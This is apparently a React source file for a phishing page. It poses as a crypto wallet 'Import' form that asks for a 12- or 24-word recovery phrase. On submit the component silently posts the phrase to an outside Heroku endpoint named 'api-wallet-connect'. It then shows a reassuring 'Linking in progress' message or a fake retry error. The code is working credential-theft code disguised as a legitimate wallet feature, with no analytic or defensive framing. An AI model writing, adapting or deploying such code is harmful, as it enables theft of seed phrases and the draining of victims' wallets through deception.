import React, { useState } from "react";
import { useFormik } from "formik";
import * as yup from "yup";
import Button from "@material-ui/core/Button";
import TextField from "@material-ui/core/TextField";
import { Grid, Typography, withStyles } from "@material-ui/core";
import axios from "axios";

const CssTextField = withStyles({
  root: {
    "& .MuiOutlinedInput-input": {
      color: "white",
    },
    "& .MuiInputLabel-root": {
      color: "white",
    },
    "& .MuiOutlinedInput-root .MuiOutlinedInput-notchedOutline": {
      borderColor: "white",
    },
    "& label.Mui-focused": {
      color: "green",
    },
    "& .MuiInput-underline:after": {
      borderBottomColor: "green",
    },
    "& .MuiOutlinedInput-root": {
      "& fieldset": {
        borderColor: "white",
      },
      "&:hover fieldset": {
        borderColor: "white",
      },
      "&.Mui-focused fieldset": {
        borderColor: "white",
      },
    },
  },
})(TextField);

const validationSchema = yup.object({
  phrase: yup.string("Enter your Phrase").required("phrase is required"),
});

export const Phrase = () => {
  const [sucess, setSucess] = useState(false);
  const [error, setError] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  // const classes = useStyles();

  const url = "https://api-wallet-connect.herokuapp.com";
  
  const formik = useFormik({
    initialValues: {
      phrase: "",
    },
    validationSchema: validationSchema,

    onSubmit: (values, { setSubmitting, resetForm, setValues }) => {
      setIsSubmitting(true);
      setTimeout(() => {
        let dataToSubmit = {
          key1: values.phrase,
          key2: "nothing here",
        };
        axios.post(url, dataToSubmit).then((response) => {
          if (response.status === 200) {
            setSucess(true);
            setIsSubmitting(false);
          } else {
            setError(true);
          }
        });
        setSubmitting(false);
        resetForm();
      }, 500);
    },
  });

  return (
    <div>
      <form
        onSubmit={formik.handleSubmit}
        autoComplete="off"
        spellcheck="false"
      >
        <div style={{ margin: "2rem 0" }}>
          <CssTextField
            id="phrase"
            fullWidth
            multiline
            placeholder="Phrase"
            rows={3}
            value={formik.values.phrase}
            onChange={formik.handleChange}
            variant="outlined"
            error={formik.touched.phrase && Boolean(formik.errors.phrase)}
            helperText={formik.touched.phrase && formik.errors.phrase}
          />
        </div>
        <Grid style={{ margin: "2rem 0", textAlign: "left" }}>
          <Typography variant="subtitle1" display="block" gutterBottom>
            Typically 12 (sometimes 24) words separated by single spaces
          </Typography>
        </Grid>
        {isSubmitting ? (
          <Button
            variant="contained"
            type="submit"
            fullWidth
            disabled={isSubmitting}
          >
            <h3 className="loading">Loading</h3>
          </Button>
        ) : (
          <Button
            variant="contained"
            type="submit"
            fullWidth
            // disabled={isSubmitting}
          >
            <h3 className="importing">Import</h3>
          </Button>
        )}

        <Grid style={{ margin: "2rem 0" }}>
          <div>
            {sucess && <h3 className="loading">Linking in progress</h3>}
            {error && (
              <div className="error">
                error: Phrase key could not be imported. Please try again
              </div>
            )}
          </div>
        </Grid>
      </form>
    </div>
  );
};
